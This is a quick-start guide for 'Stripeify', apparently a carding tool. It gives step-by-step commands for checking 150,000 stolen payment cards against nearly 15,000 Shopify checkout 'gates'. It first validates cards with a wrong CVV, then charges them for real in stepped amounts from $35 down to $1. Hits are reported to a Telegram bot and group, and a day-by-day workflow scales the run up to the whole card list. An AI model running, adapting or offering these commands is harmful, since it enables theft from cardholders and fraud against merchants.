# Stripeify - Quick Start Commands

## 🚀 Your Setup

- **Cards:** 150,000 in `extracted.txt`
- **Gates:** 14,948 in `gates_dir/gates.txt`
- **Telegram:** Configured (@EmillyLumaBot → MissNullLive)

---

## ⚡ QUICK COMMANDS

### 1. Full Production Run (Recommended)
```bash
./run_production_full.sh
```
**What it does:**
- Phase 1: Discovers valid gates (safe, no charges)
- Phase 2: Charges cards on valid gates (asks for confirmation)
- Telegram notifications throughout

---

### 2. Discovery Only (Safe - No Charges)
```bash
# Test 100 gates
chromedriver --port=9515 &
./target/release/shopify_checker discover \
    --gates-dir gates_dir \
    --cards-file extracted.txt \
    --telegram-config telegram_config.json \
    --auth-only=true \
    --max-gates 100 \
    -o discovery_results.json
```

---

### 3. Charge Cards (LIVE - Makes Real Charges)
```bash
# ⚠️ WARNING: Uses real CVV, makes actual charges!
chromedriver --port=9515 &
./target/release/shopify_checker rotate \
    --gates valid_gates.json \
    --cards-file extracted.txt \
    --telegram-config telegram_config.json \
    --auth-only=false \
    -o charged_results.json
```

---

## 🔧 TROUBLESHOOTING

### ChromeDriver Port Conflict
```bash
pkill -f chromedriver
sleep 2
chromedriver --port=9515 &
```

### Check if ChromeDriver is Running
```bash
pgrep chromedriver || echo "Not running"
```

### View Valid Gates
```bash
cat valid_gates.json | jq '.valid_gates[] | {url, success_count, failure_count}'
```

---

## 📊 UNDERSTANDING MODES

### Authorization-Only (`--auth-only=true`)
- Uses **wrong CVV (999)**
- **NO CHARGES** made
- Safe for testing
- Results: CVV_MISMATCH = valid card

### Charging Mode (`--auth-only=false`)
- Uses **real CVV** from cards
- **ACTUAL CHARGES** made
- Amounts: $35 → $25 → $14.99 → $4.99 → $2 → $1
- Results: APPROVED = charged successfully

---

## 📁 OUTPUT FILES

- `valid_gates.json` - Discovered working gates
- `discovery_results.json` - Discovery phase results
- `charged_results.json` - Charging phase results
- Telegram notifications - Real-time hits

---

## ⚠️ IMPORTANT NOTES

1. **Always test with `--auth-only=true` first**
2. **Start small** (`--max-gates 10`)
3. **Monitor Telegram** for results
4. **Backup `valid_gates.json`** regularly
5. **Phase 2 makes REAL CHARGES** - be careful!

---

## 🎯 RECOMMENDED WORKFLOW

### Day 1: Discovery
```bash
# Discover 100 gates (safe, no charges)
./run_production_full.sh
# When prompted for Phase 2, type 'no'
```

### Day 2: Review & Small Test
```bash
# Review valid gates
cat valid_gates.json | jq

# Test with 10 cards (LIVE)
chromedriver --port=9515 &
head -10 extracted.txt > test_10_cards.txt
./target/release/shopify_checker rotate \
    --gates valid_gates.json \
    --cards-file test_10_cards.txt \
    --telegram-config telegram_config.json \
    --auth-only=false
```

### Day 3+: Full Production
```bash
# Run full production (all 150k cards)
./run_production_full.sh
# When prompted for Phase 2, type 'YES'
```

---

## 📞 SUPPORT

- **Bot:** @EmillyLumaBot
- **Group:** MissNullLive
- **Credit:** @MissNullMe

---

## 🆘 NEED HELP?

Read the full guide:
```bash
cat PRODUCTION_SETUP_GUIDE.md
